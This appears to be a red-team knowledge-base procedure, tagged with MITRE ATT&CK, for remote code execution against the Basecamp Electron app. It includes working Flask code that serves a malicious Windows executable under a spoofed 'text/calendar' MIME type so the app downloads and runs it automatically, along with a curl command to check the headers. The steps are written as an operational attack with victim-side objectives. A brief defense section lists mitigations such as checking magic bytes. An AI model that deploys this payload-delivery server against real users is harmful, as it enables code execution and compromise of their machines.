---
id: proc-flask-malicious-server
tags:
  - mime-spoofing
  - http-server
  - rce
type: procedure
tools:
  - '[[tools/Flask]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/flask-serve-malicious-file]]'
verified: false
platforms:
  - Linux
  - Python
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:50.065Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Setup-Flask-Server-for-Malicious-File

## Summary

This procedure sets up a simple HTTP server using Flask to serve a malicious executable file with a spoofed text/calendar MIME type, forcing the Basecamp Electron app to download and execute it as an attachment.

## Description

The Basecamp app's OPENABLE_MIME_TYPES includes 'text/calendar', which triggers automatic execution for validated internal URLs. By serving file.exe with this MIME type via a bypassed subdomain, the app treats it as safe. This targets Windows Electron environments and requires Python/Flask installed on the attacker's server.

## Requirements

1. Python 3 and Flask installed on server
2. Malicious executable (file.exe) in server directory
3. Server accessible on port 80 from the internet

## Defense

Defensive measures and detection strategies:

- Validate MIME types against file signatures (e.g., magic bytes)
- Block or scan attachments from 'internal' domains
- Monitor for anomalous MIME types in HTTP responses via WAF

## Objectives

1. Host the payload with spoofed headers
2. Force download as attachment
3. Enable automatic execution on victim side

## Instructions

### Step 1: Prepare Malicious File

**Context**: Place the executable in the server root.

Copy file.exe to the directory where the Flask app runs.

> Ensure it's a valid Windows executable that achieves desired RCE payload.

### Step 2: Run Flask Server

**Context**: Start the server to handle requests and serve the file with custom headers.

Execute [[commands/flask-serve-malicious-file]]:

```python
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

> Expected: * Running on http://0.0.0.0:80. Test with curl -I http://your-ip/file.exe?attachment=true to see Content-Type: text/calendar and Content-Disposition: attachment.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/flask-serve-malicious-file]]

## Tools Used

- [[tools/Flask]]

## Tags

- [[mime-spoofing]]
- [[http-server]]
